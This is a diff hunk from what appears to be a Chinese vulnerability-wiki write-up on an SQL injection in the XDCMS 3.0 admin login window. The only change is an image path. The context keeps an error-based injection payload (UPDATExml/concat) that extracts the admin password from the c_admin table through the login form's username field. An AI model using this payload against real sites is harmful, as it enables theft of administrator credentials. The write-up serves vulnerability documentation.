@@ -79,7 +79,7 @@ safe\_html()使用preg\_replace()时候，pattern未添加/i修饰符，导致�
     #爆内容
     username=admin%27+OR+UPDATExml(1,concat(0x7e,(selEct+password+From+c_admin)),0)--+&password=123&verifycode=3bdd&button=
 
-![](/Users/aresx/Documents/VulWiki/.resource/XDCMS3.0后台登录窗sql注入漏洞/media/rId24.jpg)
+![](./.resource/XDCMS3.0后台登录窗sql注入漏洞/media/rId24.jpg)
 
 虽然获取密码hash值，但cms并未直接通过MD5获得哈希值，且无法破解该哈希值；
 
